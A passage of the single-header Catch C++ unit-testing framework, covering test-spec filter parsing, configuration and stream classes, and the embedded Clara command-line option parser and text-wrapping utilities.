			std::vector<Ptr<Pattern> > m_patterns;

			bool matches(TestCaseInfo const& testCase) const {
				// All patterns in a filter must match for the filter to be a match
				for (std::vector<Ptr<Pattern> >::const_iterator it = m_patterns.begin(), itEnd = m_patterns.end(); it != itEnd; ++it)
					if (!(*it)->matches(testCase))
						return false;
				return true;
			}
		};

	public:
		bool hasFilters() const {
			return !m_filters.empty();
		}
		bool matches(TestCaseInfo const& testCase) const {
			// A TestSpec matches if any filter matches
			for (std::vector<Filter>::const_iterator it = m_filters.begin(), itEnd = m_filters.end(); it != itEnd; ++it)
				if (it->matches(testCase))
					return true;
			return false;
		}

	private:
		std::vector<Filter> m_filters;

		friend class TestSpecParser;
	};
}

#ifdef __clang__
#pragma clang diagnostic pop
#endif

namespace Catch {

	class TestSpecParser {
		enum Mode { None, Name, QuotedName, Tag };
		Mode m_mode;
		bool m_exclusion;
		std::size_t m_start, m_pos;
		std::string m_arg;
		TestSpec::Filter m_currentFilter;
		TestSpec m_testSpec;
		ITagAliasRegistry const* m_tagAliases;

	public:
		TestSpecParser(ITagAliasRegistry const& tagAliases) : m_tagAliases(&tagAliases) {}

		TestSpecParser& parse(std::string const& arg) {
			m_mode = None;
			m_exclusion = false;
			m_start = std::string::npos;
			m_arg = m_tagAliases->expandAliases(arg);
			for (m_pos = 0; m_pos < m_arg.size(); ++m_pos)
				visitChar(m_arg[m_pos]);
			if (m_mode == Name)
				addPattern<TestSpec::NamePattern>();
			return *this;
		}
		TestSpec testSpec() {
			addFilter();
			return m_testSpec;
		}
	private:
		void visitChar(char c) {
			if (m_mode == None) {
				switch (c) {
				case ' ': return;
				case '~': m_exclusion = true; return;
				case '[': return startNewMode(Tag, ++m_pos);
				case '"': return startNewMode(QuotedName, ++m_pos);
				default: startNewMode(Name, m_pos); break;
				}
			}
			if (m_mode == Name) {
				if (c == ',') {
					addPattern<TestSpec::NamePattern>();
					addFilter();
				}
				else if (c == '[') {
					if (subString() == "exclude:")
						m_exclusion = true;
					else
						addPattern<TestSpec::NamePattern>();
					startNewMode(Tag, ++m_pos);
				}
			}
			else if (m_mode == QuotedName && c == '"')
				addPattern<TestSpec::NamePattern>();
			else if (m_mode == Tag && c == ']')
				addPattern<TestSpec::TagPattern>();
		}
		void startNewMode(Mode mode, std::size_t start) {
			m_mode = mode;
			m_start = start;
		}
		std::string subString() const { return m_arg.substr(m_start, m_pos - m_start); }
		template<typename T>
		void addPattern() {
			std::string token = subString();
			if (startsWith(token, "exclude:")) {
				m_exclusion = true;
				token = token.substr(8);
			}
			if (!token.empty()) {
				Ptr<TestSpec::Pattern> pattern = new T(token);
				if (m_exclusion)
					pattern = new TestSpec::ExcludedPattern(pattern);
				m_currentFilter.m_patterns.push_back(pattern);
			}
			m_exclusion = false;
			m_mode = None;
		}
		void addFilter() {
			if (!m_currentFilter.m_patterns.empty()) {
				m_testSpec.m_filters.push_back(m_currentFilter);
				m_currentFilter = TestSpec::Filter();
			}
		}
	};
	inline TestSpec parseTestSpec(std::string const& arg) {
		return TestSpecParser(ITagAliasRegistry::get()).parse(arg).testSpec();
	}

} // namespace Catch

#ifdef __clang__
#pragma clang diagnostic pop
#endif

  // #included from: catch_interfaces_config.h
#define TWOBLUECUBES_CATCH_INTERFACES_CONFIG_H_INCLUDED

#include <iostream>
#include <string>
#include <vector>

namespace Catch {

	struct Verbosity {
		enum Level {
			NoOutput = 0,
			Quiet,
			Normal
		};
	};

	struct WarnAbout {
		enum What {
			Nothing = 0x00,
			NoAssertions = 0x01
		};
	};

	struct ShowDurations {
		enum OrNot {
			DefaultForReporter,
			Always,
			Never
		};
	};
	struct RunTests {
		enum InWhatOrder {
			InDeclarationOrder,
			InLexicographicalOrder,
			InRandomOrder
		};
	};
	struct UseColour {
		enum YesOrNo {
			Auto,
			Yes,
			No
		};
	};

	class TestSpec;

	struct IConfig : IShared {

		virtual ~IConfig();

		virtual bool allowThrows() const = 0;
		virtual std::ostream& stream() const = 0;
		virtual std::string name() const = 0;
		virtual bool includeSuccessfulResults() const = 0;
		virtual bool shouldDebugBreak() const = 0;
		virtual bool warnAboutMissingAssertions() const = 0;
		virtual int abortAfter() const = 0;
		virtual bool showInvisibles() const = 0;
		virtual ShowDurations::OrNot showDurations() const = 0;
		virtual TestSpec const& testSpec() const = 0;
		virtual RunTests::InWhatOrder runOrder() const = 0;
		virtual unsigned int rngSeed() const = 0;
		virtual UseColour::YesOrNo useColour() const = 0;
	};
}

// #included from: catch_stream.h
#define TWOBLUECUBES_CATCH_STREAM_H_INCLUDED

// #included from: catch_streambuf.h
#define TWOBLUECUBES_CATCH_STREAMBUF_H_INCLUDED

#include <streambuf>

namespace Catch {

	class StreamBufBase : public std::streambuf {
	public:
		virtual ~StreamBufBase() CATCH_NOEXCEPT;
	};
}

#include <streambuf>
#include <ostream>
#include <fstream>

namespace Catch {

	std::ostream& cout();
	std::ostream& cerr();

	struct IStream {
		virtual ~IStream() CATCH_NOEXCEPT;
		virtual std::ostream& stream() const = 0;
	};

	class FileStream : public IStream {
		mutable std::ofstream m_ofs;
	public:
		FileStream(std::string const& filename);
		virtual ~FileStream() CATCH_NOEXCEPT;
	public: // IStream
		virtual std::ostream& stream() const CATCH_OVERRIDE;
	};

	class CoutStream : public IStream {
		mutable std::ostream m_os;
	public:
		CoutStream();
		virtual ~CoutStream() CATCH_NOEXCEPT;

	public: // IStream
		virtual std::ostream& stream() const CATCH_OVERRIDE;
	};

	class DebugOutStream : public IStream {
		std::auto_ptr<StreamBufBase> m_streamBuf;
		mutable std::ostream m_os;
	public:
		DebugOutStream();
		virtual ~DebugOutStream() CATCH_NOEXCEPT;

	public: // IStream
		virtual std::ostream& stream() const CATCH_OVERRIDE;
	};
}

#include <memory>
#include <vector>
#include <string>
#include <iostream>
#include <ctime>

#ifndef CATCH_CONFIG_CONSOLE_WIDTH
#define CATCH_CONFIG_CONSOLE_WIDTH 80
#endif

namespace Catch {

	struct ConfigData {

		ConfigData()
			: listTests(false),
			listTags(false),
			listReporters(false),
			listTestNamesOnly(false),
			showSuccessfulTests(false),
			shouldDebugBreak(false),
			noThrow(false),
			showHelp(false),
			showInvisibles(false),
			filenamesAsTags(false),
			abortAfter(-1),
			rngSeed(0),
			verbosity(Verbosity::Normal),
			warnings(WarnAbout::Nothing),
			showDurations(ShowDurations::DefaultForReporter),
			runOrder(RunTests::InDeclarationOrder),
			useColour(UseColour::Auto)
		{}

		bool listTests;
		bool listTags;
		bool listReporters;
		bool listTestNamesOnly;

		bool showSuccessfulTests;
		bool shouldDebugBreak;
		bool noThrow;
		bool showHelp;
		bool showInvisibles;
		bool filenamesAsTags;

		int abortAfter;
		unsigned int rngSeed;

		Verbosity::Level verbosity;
		WarnAbout::What warnings;
		ShowDurations::OrNot showDurations;
		RunTests::InWhatOrder runOrder;
		UseColour::YesOrNo useColour;

		std::string outputFilename;
		std::string name;
		std::string processName;

		std::vector<std::string> reporterNames;
		std::vector<std::string> testsOrTags;
	};

	class Config : public SharedImpl<IConfig> {
	private:
		Config(Config const& other);
		Config& operator = (Config const& other);
		virtual void dummy();
	public:

		Config()
		{}

		Config(ConfigData const& data)
			: m_data(data),
			m_stream(openStream())
		{
			if (!data.testsOrTags.empty()) {
				TestSpecParser parser(ITagAliasRegistry::get());
				for (std::size_t i = 0; i < data.testsOrTags.size(); ++i)
					parser.parse(data.testsOrTags[i]);
				m_testSpec = parser.testSpec();
			}
		}

		virtual ~Config() {
		}

		std::string const& getFilename() const {
			return m_data.outputFilename;
		}

		bool listTests() const { return m_data.listTests; }
		bool listTestNamesOnly() const { return m_data.listTestNamesOnly; }
		bool listTags() const { return m_data.listTags; }
		bool listReporters() const { return m_data.listReporters; }

		std::string getProcessName() const { return m_data.processName; }

		bool shouldDebugBreak() const { return m_data.shouldDebugBreak; }

		std::vector<std::string> getReporterNames() const { return m_data.reporterNames; }

		int abortAfter() const { return m_data.abortAfter; }

		TestSpec const& testSpec() const { return m_testSpec; }

		bool showHelp() const { return m_data.showHelp; }
		bool showInvisibles() const { return m_data.showInvisibles; }

		// IConfig interface
		virtual bool allowThrows() const { return !m_data.noThrow; }
		virtual std::ostream& stream() const { return m_stream->stream(); }
		virtual std::string name() const { return m_data.name.empty() ? m_data.processName : m_data.name; }
		virtual bool includeSuccessfulResults() const { return m_data.showSuccessfulTests; }
		virtual bool warnAboutMissingAssertions() const { return m_data.warnings & WarnAbout::NoAssertions; }
		virtual ShowDurations::OrNot showDurations() const { return m_data.showDurations; }
		virtual RunTests::InWhatOrder runOrder() const { return m_data.runOrder; }
		virtual unsigned int rngSeed() const { return m_data.rngSeed; }
		virtual UseColour::YesOrNo useColour() const { return m_data.useColour; }

	private:

		IStream const* openStream() {
			if (m_data.outputFilename.empty())
				return new CoutStream();
			else if (m_data.outputFilename[0] == '%') {
				if (m_data.outputFilename == "%debug")
					return new DebugOutStream();
				else
					throw std::domain_error("Unrecognised stream: " + m_data.outputFilename);
			}
			else
				return new FileStream(m_data.outputFilename);
		}
		ConfigData m_data;

		std::auto_ptr<IStream const> m_stream;
		TestSpec m_testSpec;
	};

} // end namespace Catch

  // #included from: catch_clara.h
#define TWOBLUECUBES_CATCH_CLARA_H_INCLUDED

  // Use Catch's value for console width (store Clara's off to the side, if present)
#ifdef CLARA_CONFIG_CONSOLE_WIDTH
#define CATCH_TEMP_CLARA_CONFIG_CONSOLE_WIDTH CLARA_CONFIG_CONSOLE_WIDTH
#undef CLARA_CONFIG_CONSOLE_WIDTH
#endif
#define CLARA_CONFIG_CONSOLE_WIDTH CATCH_CONFIG_CONSOLE_WIDTH

  // Declare Clara inside the Catch namespace
#define STITCH_CLARA_OPEN_NAMESPACE namespace Catch {
  // #included from: ../external/clara.h

  // Version 0.0.2.4

  // Only use header guard if we are not using an outer namespace
#if !defined(TWOBLUECUBES_CLARA_H_INCLUDED) || defined(STITCH_CLARA_OPEN_NAMESPACE)

#ifndef STITCH_CLARA_OPEN_NAMESPACE
#define TWOBLUECUBES_CLARA_H_INCLUDED
#define STITCH_CLARA_OPEN_NAMESPACE
#define STITCH_CLARA_CLOSE_NAMESPACE
#else
#define STITCH_CLARA_CLOSE_NAMESPACE }
#endif

#define STITCH_TBC_TEXT_FORMAT_OPEN_NAMESPACE STITCH_CLARA_OPEN_NAMESPACE

  // ----------- #included from tbc_text_format.h -----------

  // Only use header guard if we are not using an outer namespace
#if !defined(TBC_TEXT_FORMAT_H_INCLUDED) || defined(STITCH_TBC_TEXT_FORMAT_OUTER_NAMESPACE)
#ifndef STITCH_TBC_TEXT_FORMAT_OUTER_NAMESPACE
#define TBC_TEXT_FORMAT_H_INCLUDED
#endif

#include <string>
#include <vector>
#include <sstream>
#include <algorithm>

  // Use optional outer namespace
#ifdef STITCH_TBC_TEXT_FORMAT_OUTER_NAMESPACE
namespace STITCH_TBC_TEXT_FORMAT_OUTER_NAMESPACE {
#endif

	namespace Tbc {

#ifdef TBC_TEXT_FORMAT_CONSOLE_WIDTH
		const unsigned int consoleWidth = TBC_TEXT_FORMAT_CONSOLE_WIDTH;
#else
		const unsigned int consoleWidth = 80;
#endif

		struct TextAttributes {
			TextAttributes()
				: initialIndent(std::string::npos),
				indent(0),
				width(consoleWidth - 1),
				tabChar('\t')
			{}

			TextAttributes& setInitialIndent(std::size_t _value) { initialIndent = _value; return *this; }
			TextAttributes& setIndent(std::size_t _value) { indent = _value; return *this; }
			TextAttributes& setWidth(std::size_t _value) { width = _value; return *this; }
			TextAttributes& setTabChar(char _value) { tabChar = _value; return *this; }

			std::size_t initialIndent;  // indent of first line, or npos
			std::size_t indent;         // indent of subsequent lines, or all if initialIndent is npos
			std::size_t width;          // maximum width of text, including indent. Longer text will wrap
			char tabChar;               // If this char is seen the indent is changed to current pos
		};

		class Text {
		public:
			Text(std::string const& _str, TextAttributes const& _attr = TextAttributes())
				: attr(_attr)
			{
				std::string wrappableChars = " [({.,/|\\-";
				std::size_t indent = _attr.initialIndent != std::string::npos
					? _attr.initialIndent
					: _attr.indent;
				std::string remainder = _str;

				while (!remainder.empty()) {
					if (lines.size() >= 1000) {
						lines.push_back("... message truncated due to excessive size");
						return;
					}
					std::size_t tabPos = std::string::npos;
					std::size_t width = (std::min)(remainder.size(), _attr.width - indent);
					std::size_t pos = remainder.find_first_of('\n');
					if (pos <= width) {
						width = pos;
					}
					pos = remainder.find_last_of(_attr.tabChar, width);
					if (pos != std::string::npos) {
						tabPos = pos;
						if (remainder[width] == '\n')
							width--;
						remainder = remainder.substr(0, tabPos) + remainder.substr(tabPos + 1);
					}

					if (width == remainder.size()) {
						spliceLine(indent, remainder, width);
					}
					else if (remainder[width] == '\n') {
						spliceLine(indent, remainder, width);
						if (width <= 1 || remainder.size() != 1)
							remainder = remainder.substr(1);
						indent = _attr.indent;
					}
					else {
						pos = remainder.find_last_of(wrappableChars, width);
						if (pos != std::string::npos && pos > 0) {
							spliceLine(indent, remainder, pos);
							if (remainder[0] == ' ')
								remainder = remainder.substr(1);
						}
						else {
							spliceLine(indent, remainder, width - 1);
							lines.back() += "-";
						}
						if (lines.size() == 1)
							indent = _attr.indent;
						if (tabPos != std::string::npos)
							indent += tabPos;
					}
				}
			}

			void spliceLine(std::size_t _indent, std::string& _remainder, std::size_t _pos) {
				lines.push_back(std::string(_indent, ' ') + _remainder.substr(0, _pos));
				_remainder = _remainder.substr(_pos);
			}

			typedef std::vector<std::string>::const_iterator const_iterator;

			const_iterator begin() const { return lines.begin(); }
			const_iterator end() const { return lines.end(); }
			std::string const& last() const { return lines.back(); }
			std::size_t size() const { return lines.size(); }
			std::string const& operator[](std::size_t _index) const { return lines[_index]; }
			std::string toString() const {
				std::ostringstream oss;
				oss << *this;
				return oss.str();
			}

			inline friend std::ostream& operator << (std::ostream& _stream, Text const& _text) {
				for (Text::const_iterator it = _text.begin(), itEnd = _text.end();
					it != itEnd; ++it) {
					if (it != _text.begin())
						_stream << "\n";
					_stream << *it;
				}
				return _stream;
			}

		private:
			std::string str;
			TextAttributes attr;
			std::vector<std::string> lines;
		};

	} // end namespace Tbc

#ifdef STITCH_TBC_TEXT_FORMAT_OUTER_NAMESPACE
} // end outer namespace
#endif

#endif // TBC_TEXT_FORMAT_H_INCLUDED

  // ----------- end of #include from tbc_text_format.h -----------
  // ........... back in clara.h

#undef STITCH_TBC_TEXT_FORMAT_OPEN_NAMESPACE

  // ----------- #included from clara_compilers.h -----------

#ifndef TWOBLUECUBES_CLARA_COMPILERS_H_INCLUDED
#define TWOBLUECUBES_CLARA_COMPILERS_H_INCLUDED

  // Detect a number of compiler features - mostly C++11/14 conformance - by compiler
  // The following features are defined:
  //
  // CLARA_CONFIG_CPP11_NULLPTR : is nullptr supported?
  // CLARA_CONFIG_CPP11_NOEXCEPT : is noexcept supported?
  // CLARA_CONFIG_CPP11_GENERATED_METHODS : The delete and default keywords for compiler generated methods
  // CLARA_CONFIG_CPP11_OVERRIDE : is override supported?
  // CLARA_CONFIG_CPP11_UNIQUE_PTR : is unique_ptr supported (otherwise use auto_ptr)

  // CLARA_CONFIG_CPP11_OR_GREATER : Is C++11 supported?

  // CLARA_CONFIG_VARIADIC_MACROS : are variadic macros supported?

  // In general each macro has a _NO_<feature name> form
  // (e.g. CLARA_CONFIG_CPP11_NO_NULLPTR) which disables the feature.
  // Many features, at point of detection, define an _INTERNAL_ macro, so they
  // can be combined, en-mass, with the _NO_ forms later.

  // All the C++11 features can be disabled with CLARA_CONFIG_NO_CPP11

#ifdef __clang__

#if __has_feature(cxx_nullptr)
#define CLARA_INTERNAL_CONFIG_CPP11_NULLPTR
#endif

#if __has_feature(cxx_noexcept)
#define CLARA_INTERNAL_CONFIG_CPP11_NOEXCEPT
#endif

#endif // __clang__

  ////////////////////////////////////////////////////////////////////////////////
  // GCC
#ifdef __GNUC__

#if __GNUC__ == 4 && __GNUC_MINOR__ >= 6 && defined(__GXX_EXPERIMENTAL_CXX0X__)
#define CLARA_INTERNAL_CONFIG_CPP11_NULLPTR
#endif

  // - otherwise more recent versions define __cplusplus >= 201103L
  // and will get picked up below

#endif // __GNUC__

  ////////////////////////////////////////////////////////////////////////////////
  // Visual C++
#ifdef _MSC_VER

#if (_MSC_VER >= 1600)
#define CLARA_INTERNAL_CONFIG_CPP11_NULLPTR
#define CLARA_INTERNAL_CONFIG_CPP11_UNIQUE_PTR
#endif

#if (_MSC_VER >= 1900 ) // (VC++ 13 (VS2015))
#define CLARA_INTERNAL_CONFIG_CPP11_NOEXCEPT
#define CLARA_INTERNAL_CONFIG_CPP11_GENERATED_METHODS
#endif

#endif // _MSC_VER

  ////////////////////////////////////////////////////////////////////////////////
  // C++ language feature support

  // catch all support for C++11
#if defined(__cplusplus) && __cplusplus >= 201103L

#define CLARA_CPP11_OR_GREATER

#if !defined(CLARA_INTERNAL_CONFIG_CPP11_NULLPTR)
#define CLARA_INTERNAL_CONFIG_CPP11_NULLPTR
#endif

#ifndef CLARA_INTERNAL_CONFIG_CPP11_NOEXCEPT
#define CLARA_INTERNAL_CONFIG_CPP11_NOEXCEPT
#endif

#ifndef CLARA_INTERNAL_CONFIG_CPP11_GENERATED_METHODS
#define CLARA_INTERNAL_CONFIG_CPP11_GENERATED_METHODS
#endif

#if !defined(CLARA_INTERNAL_CONFIG_CPP11_OVERRIDE)
#define CLARA_INTERNAL_CONFIG_CPP11_OVERRIDE
#endif
#if !defined(CLARA_INTERNAL_CONFIG_CPP11_UNIQUE_PTR)
#define CLARA_INTERNAL_CONFIG_CPP11_UNIQUE_PTR
#endif

#endif // __cplusplus >= 201103L

  // Now set the actual defines based on the above + anything the user has configured
#if defined(CLARA_INTERNAL_CONFIG_CPP11_NULLPTR) && !defined(CLARA_CONFIG_CPP11_NO_NULLPTR) && !defined(CLARA_CONFIG_CPP11_NULLPTR) && !defined(CLARA_CONFIG_NO_CPP11)
#define CLARA_CONFIG_CPP11_NULLPTR
#endif
#if defined(CLARA_INTERNAL_CONFIG_CPP11_NOEXCEPT) && !defined(CLARA_CONFIG_CPP11_NO_NOEXCEPT) && !defined(CLARA_CONFIG_CPP11_NOEXCEPT) && !defined(CLARA_CONFIG_NO_CPP11)
#define CLARA_CONFIG_CPP11_NOEXCEPT
#endif
#if defined(CLARA_INTERNAL_CONFIG_CPP11_GENERATED_METHODS) && !defined(CLARA_CONFIG_CPP11_NO_GENERATED_METHODS) && !defined(CLARA_CONFIG_CPP11_GENERATED_METHODS) && !defined(CLARA_CONFIG_NO_CPP11)
#define CLARA_CONFIG_CPP11_GENERATED_METHODS
#endif
#if defined(CLARA_INTERNAL_CONFIG_CPP11_OVERRIDE) && !defined(CLARA_CONFIG_NO_OVERRIDE) && !defined(CLARA_CONFIG_CPP11_OVERRIDE) && !defined(CLARA_CONFIG_NO_CPP11)
#define CLARA_CONFIG_CPP11_OVERRIDE
#endif
#if defined(CLARA_INTERNAL_CONFIG_CPP11_UNIQUE_PTR) && !defined(CLARA_CONFIG_NO_UNIQUE_PTR) && !defined(CLARA_CONFIG_CPP11_UNIQUE_PTR) && !defined(CLARA_CONFIG_NO_CPP11)
#define CLARA_CONFIG_CPP11_UNIQUE_PTR
#endif

  // noexcept support:
#if defined(CLARA_CONFIG_CPP11_NOEXCEPT) && !defined(CLARA_NOEXCEPT)
#define CLARA_NOEXCEPT noexcept
#  define CLARA_NOEXCEPT_IS(x) noexcept(x)
#else
#define CLARA_NOEXCEPT throw()
#  define CLARA_NOEXCEPT_IS(x)
#endif

  // nullptr support
#ifdef CLARA_CONFIG_CPP11_NULLPTR
#define CLARA_NULL nullptr
#else
#define CLARA_NULL NULL
#endif

  // override support
#ifdef CLARA_CONFIG_CPP11_OVERRIDE
#define CLARA_OVERRIDE override
#else
#define CLARA_OVERRIDE
#endif

  // unique_ptr support
#ifdef CLARA_CONFIG_CPP11_UNIQUE_PTR
#   define CLARA_AUTO_PTR( T ) std::unique_ptr<T>
#else
#   define CLARA_AUTO_PTR( T ) std::auto_ptr<T>
#endif

#endif // TWOBLUECUBES_CLARA_COMPILERS_H_INCLUDED

  // ----------- end of #include from clara_compilers.h -----------
  // ........... back in clara.h

#include <map>
#include <stdexcept>
#include <memory>

#if defined(WIN32) || defined(__WIN32__) || defined(_WIN32) || defined(_MSC_VER)
#define CLARA_PLATFORM_WINDOWS
#endif

  // Use optional outer namespace
#ifdef STITCH_CLARA_OPEN_NAMESPACE
STITCH_CLARA_OPEN_NAMESPACE
#endif

namespace Clara {

	struct UnpositionalTag {};

	extern UnpositionalTag _;

#ifdef CLARA_CONFIG_MAIN
	UnpositionalTag _;
#endif

	namespace Detail {

#ifdef CLARA_CONSOLE_WIDTH
		const unsigned int consoleWidth = CLARA_CONFIG_CONSOLE_WIDTH;
#else
		const unsigned int consoleWidth = 80;
#endif

		using namespace Tbc;

		inline bool startsWith(std::string const& str, std::string const& prefix) {
			return str.size() >= prefix.size() && str.substr(0, prefix.size()) == prefix;
		}

		template<typename T> struct RemoveConstRef { typedef T type; };
		template<typename T> struct RemoveConstRef<T&> { typedef T type; };
		template<typename T> struct RemoveConstRef<T const&> { typedef T type; };
		template<typename T> struct RemoveConstRef<T const> { typedef T type; };

		template<typename T>    struct IsBool { static const bool value = false; };
		template<>              struct IsBool<bool> { static const bool value = true; };

		template<typename T>
		void convertInto(std::string const& _source, T& _dest) {
			std::stringstream ss;
			ss << _source;
			ss >> _dest;
			if (ss.fail())
				throw std::runtime_error("Unable to convert " + _source + " to destination type");
		}
		inline void convertInto(std::string const& _source, std::string& _dest) {
			_dest = _source;
		}
		inline void convertInto(std::string const& _source, bool& _dest) {
			std::string sourceLC = _source;
			std::transform(sourceLC.begin(), sourceLC.end(), sourceLC.begin(), ::tolower);
			if (sourceLC == "y" || sourceLC == "1" || sourceLC == "true" || sourceLC == "yes" || sourceLC == "on")
				_dest = true;
			else if (sourceLC == "n" || sourceLC == "0" || sourceLC == "false" || sourceLC == "no" || sourceLC == "off")
				_dest = false;
			else
				throw std::runtime_error("Expected a boolean value but did not recognise:\n  '" + _source + "'");
		}

		template<typename ConfigT>
		struct IArgFunction {
			virtual ~IArgFunction() {}
#ifdef CLARA_CONFIG_CPP11_GENERATED_METHODS
			IArgFunction() = default;
			IArgFunction(IArgFunction const&) = default;
#endif
			virtual void set(ConfigT& config, std::string const& value) const = 0;
			virtual bool takesArg() const = 0;
			virtual IArgFunction* clone() const = 0;
		};

		template<typename ConfigT>
		class BoundArgFunction {
		public:
			BoundArgFunction() : functionObj(CLARA_NULL) {}
			BoundArgFunction(IArgFunction<ConfigT>* _functionObj) : functionObj(_functionObj) {}
			BoundArgFunction(BoundArgFunction const& other) : functionObj(other.functionObj ? other.functionObj->clone() : CLARA_NULL) {}
			BoundArgFunction& operator = (BoundArgFunction const& other) {
				IArgFunction<ConfigT>* newFunctionObj = other.functionObj ? other.functionObj->clone() : CLARA_NULL;
				delete functionObj;
				functionObj = newFunctionObj;
				return *this;
			}
			~BoundArgFunction() { delete functionObj; }

			void set(ConfigT& config, std::string const& value) const {
				functionObj->set(config, value);
			}
			bool takesArg() const { return functionObj->takesArg(); }

			bool isSet() const {
				return functionObj != CLARA_NULL;
			}
		private:
			IArgFunction<ConfigT>* functionObj;
		};

		template<typename C>
		struct NullBinder : IArgFunction<C> {
			virtual void set(C&, std::string const&) const {}
			virtual bool takesArg() const { return true; }
			virtual IArgFunction<C>* clone() const { return new NullBinder(*this); }
		};

		template<typename C, typename M>
		struct BoundDataMember : IArgFunction<C> {
			BoundDataMember(M C::* _member) : member(_member) {}
			virtual void set(C& p, std::string const& stringValue) const {
				convertInto(stringValue, p.*member);
			}
			virtual bool takesArg() const { return !IsBool<M>::value; }
			virtual IArgFunction<C>* clone() const { return new BoundDataMember(*this); }
			M C::* member;
		};
		template<typename C, typename M>
		struct BoundUnaryMethod : IArgFunction<C> {
			BoundUnaryMethod(void (C::*_member)(M)) : member(_member) {}
			virtual void set(C& p, std::string const& stringValue) const {
				typename RemoveConstRef<M>::type value;
				convertInto(stringValue, value);
				(p.*member)(value);
			}
			virtual bool takesArg() const { return !IsBool<M>::value; }
			virtual IArgFunction<C>* clone() const { return new BoundUnaryMethod(*this); }
			void (C::*member)(M);
		};
		template<typename C>
		struct BoundNullaryMethod : IArgFunction<C> {
			BoundNullaryMethod(void (C::*_member)()) : member(_member) {}
			virtual void set(C& p, std::string const& stringValue) const {
				bool value;
				convertInto(stringValue, value);
				if (value)
					(p.*member)();
			}
			virtual bool takesArg() const { return false; }
			virtual IArgFunction<C>* clone() const { return new BoundNullaryMethod(*this); }
			void (C::*member)();
		};

		template<typename C>
		struct BoundUnaryFunction : IArgFunction<C> {
			BoundUnaryFunction(void(*_function)(C&)) : function(_function) {}
			virtual void set(C& obj, std::string const& stringValue) const {
				bool value;
				convertInto(stringValue, value);
				if (value)
					function(obj);
			}
			virtual bool takesArg() const { return false; }
			virtual IArgFunction<C>* clone() const { return new BoundUnaryFunction(*this); }
			void(*function)(C&);
		};

		template<typename C, typename T>
		struct BoundBinaryFunction : IArgFunction<C> {
			BoundBinaryFunction(void(*_function)(C&, T)) : function(_function) {}
			virtual void set(C& obj, std::string const& stringValue) const {
				typename RemoveConstRef<T>::type value;
				convertInto(stringValue, value);
				function(obj, value);
			}
			virtual bool takesArg() const { return !IsBool<T>::value; }
			virtual IArgFunction<C>* clone() const { return new BoundBinaryFunction(*this); }
			void(*function)(C&, T);
		};

	} // namespace Detail

	inline std::vector<std::string> argsToVector(int argc, char const* const* const argv) {
		std::vector<std::string> args(static_cast<std::size_t>(argc));
		for (std::size_t i = 0; i < static_cast<std::size_t>(argc); ++i)
			args[i] = argv[i];

		return args;
	}

	class Parser {
		enum Mode { None, MaybeShortOpt, SlashOpt, ShortOpt, LongOpt, Positional };
		Mode mode;
		std::size_t from;
		bool inQuotes;
	public:

		struct Token {
			enum Type { Positional, ShortOpt, LongOpt };
			Token(Type _type, std::string const& _data) : type(_type), data(_data) {}
			Type type;
			std::string data;
		};

		Parser() : mode(None), from(0), inQuotes(false) {}

		void parseIntoTokens(std::vector<std::string> const& args, std::vector<Token>& tokens) {
			const std::string doubleDash = "--";
			for (std::size_t i = 1; i < args.size() && args[i] != doubleDash; ++i)
				parseIntoTokens(args[i], tokens);
		}

		void parseIntoTokens(std::string const& arg, std::vector<Token>& tokens) {
			for (std::size_t i = 0; i <= arg.size(); ++i) {
				char c = arg[i];
				if (c == '"')
					inQuotes = !inQuotes;
				mode = handleMode(i, c, arg, tokens);
			}
		}
		Mode handleMode(std::size_t i, char c, std::string const& arg, std::vector<Token>& tokens) {
			switch (mode) {
			case None: return handleNone(i, c);
			case MaybeShortOpt: return handleMaybeShortOpt(i, c);
			case ShortOpt:
			case LongOpt:
			case SlashOpt: return handleOpt(i, c, arg, tokens);
			case Positional: return handlePositional(i, c, arg, tokens);
			default: throw std::logic_error("Unknown mode");
			}
		}

		Mode handleNone(std::size_t i, char c) {
			if (inQuotes) {
				from = i;
				return Positional;
			}
			switch (c) {
			case '-': return MaybeShortOpt;
#ifdef CLARA_PLATFORM_WINDOWS
			case '/': from = i + 1; return SlashOpt;
#endif
			default: from = i; return Positional;
			}
		}
		Mode handleMaybeShortOpt(std::size_t i, char c) {
			switch (c) {
			case '-': from = i + 1; return LongOpt;
			default: from = i; return ShortOpt;
			}
		}
		Mode handleOpt(std::size_t i, char c, std::string const& arg, std::vector<Token>& tokens) {
			if (std::string(":=\0", 5).find(c) == std::string::npos)
				return mode;

			std::string optName = arg.substr(from, i - from);
			if (mode == ShortOpt)
				for (std::size_t j = 0; j < optName.size(); ++j)
					tokens.push_back(Token(Token::ShortOpt, optName.substr(j, 1)));
			else if (mode == SlashOpt && optName.size() == 1)
				tokens.push_back(Token(Token::ShortOpt, optName));
			else
				tokens.push_back(Token(Token::LongOpt, optName));
			return None;
		}
		Mode handlePositional(std::size_t i, char c, std::string const& arg, std::vector<Token>& tokens) {
			if (inQuotes || std::string("\0", 3).find(c) == std::string::npos)
				return mode;

			std::string data = arg.substr(from, i - from);
			tokens.push_back(Token(Token::Positional, data));
			return None;
		}
	};

	template<typename ConfigT>
	struct CommonArgProperties {
		CommonArgProperties() {}
		CommonArgProperties(Detail::BoundArgFunction<ConfigT> const& _boundField) : boundField(_boundField) {}

		Detail::BoundArgFunction<ConfigT> boundField;
		std::string description;
		std::string detail;
		std::string placeholder; // Only value if boundField takes an arg

		bool takesArg() const {
			return !placeholder.empty();
		}
		void validate() const {
			if (!boundField.isSet())
				throw std::logic_error("option not bound");
		}
	};
	struct OptionArgProperties {
		std::vector<std::string> shortNames;
		std::string longName;

		bool hasShortName(std::string const& shortName) const {
			return std::find(shortNames.begin(), shortNames.end(), shortName) != shortNames.end();
		}
		bool hasLongName(std::string const& _longName) const {
			return _longName == longName;
		}
	};
	struct PositionalArgProperties {
		PositionalArgProperties() : position(-1) {}
		int position; // -1 means non-positional (floating)

		bool isFixedPositional() const {
			return position != -1;
		}
	};

	template<typename ConfigT>
	class CommandLine {

		struct Arg : CommonArgProperties<ConfigT>, OptionArgProperties, PositionalArgProperties {
			Arg() {}
			Arg(Detail::BoundArgFunction<ConfigT> const& _boundField) : CommonArgProperties<ConfigT>(_boundField) {}

			using CommonArgProperties<ConfigT>::placeholder; // !TBD

			std::string dbgName() const {
				if (!longName.empty())
					return "--" + longName;
				if (!shortNames.empty())
					return "-" + shortNames[0];
				return "positional args";
			}
			std::string commands() const {
				std::ostringstream oss;
				bool first = true;
				std::vector<std::string>::const_iterator it = shortNames.begin(), itEnd = shortNames.end();
				for (; it != itEnd; ++it) {
					if (first)
						first = false;
					else
						oss << ", ";
					oss << "-" << *it;
				}
				if (!longName.empty()) {
					if (!first)
						oss << ", ";
					oss << "--" << longName;
				}
				if (!placeholder.empty())
